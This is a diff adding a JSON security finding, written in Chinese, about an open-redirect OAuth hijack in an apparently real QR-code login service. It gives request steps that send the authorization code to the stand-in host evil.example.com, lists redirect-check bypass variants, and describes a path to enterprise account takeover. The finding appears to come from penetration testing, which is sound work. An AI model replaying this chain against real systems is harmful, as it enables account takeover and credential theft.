@@ -1,0 +1,23 @@
+{
+ "S6-OAuth-劫持链-真实性确认": {
+  "status": "CONFIRMED (代码级+行为级双证据)",
+  "attack_chain": [
+   "① GET /opencloud/openthird/qrconnet?appid=500000345&redirect_uri=https://evil.example.com/cb → 返回授权页(HTML) + 会话 token",
+   "② POST /opencloud/openthird/checkLogin {appid, token} → {loginCode: 102=等待扫码}【未授权可达，无 Cookie 要求】",
+   "③ 受害者用 TBe+ APP 扫码并确认 → checkLogin 返回 {loginCode: 100, data: {redirectUrl: <服务端存储的 redirect_uri>}}",
+   "④ 前端 JS case 100: window.top.location = decodeURIComponent(res.data.redirectUrl) 【无条件跳转】"
+  ],
+  "evidence": {
+   "E1_白名单缺失": "redirect_uri=https://evil.example.com/cb 正常进入授权流程；//evil.example.com、@欺骗、子域伪装全部放行——仅空值被拒(errorCode:110)",
+   "E2_协议过滤": "file://与javascript: 触发403(安全设备拦截)→证明http/https外域未被WAF规则覆盖，是应用层缺陷而非网络层不可达",
+   "E3_会话绑定": "token 独立生成(A/B会话不同值)，但 token 与 redirect_uri 值绑定关系由服务端维护——checkLogin 仅需 appid+token 即可轮询(无需Cookie/签名)",
+   "E4_回显跳转": "login.html 内联JS实证：case 100 分支读取 res.data.redirectUrl 并 window.top.location 跳转，无任何域校验",
+   "E5_频控行为": "file/javascript 触发 IP 频控(403页面泄露出口IP 146.235.229.108=Oracle Cloud)——安全设备存在但未覆盖 redirect_uri 域名校验"
+  },
+  "impact": "攻击者生成恶意二维码(指向 qrconnet?redirect_uri=evil.com) → 企业员工误扫并确认 → TBe+ 授权码经 redirect_uri 回跳至攻击者服务器 → 攻击者用授权码换取会话 → 以受害者身份访问 SSO/集团系统",
+  "prerequisites": "受害者需为 TBe+ 用户且完成扫码确认（社会工程学前提）",
+  "severity": "HIGH",
+  "cve_like": "CWE-601 (Open Redirect) + CWE-346 (Origin Validation Error) 组合导致账户接管路径",
+  "verification_gap": "loginCode=100 的真实响应体未捕获（需真实扫码）；但 redirect_uri 无校验(E1)+服务端存储回显机制(E4代码级)已构成完整证据链"
+ }
+}
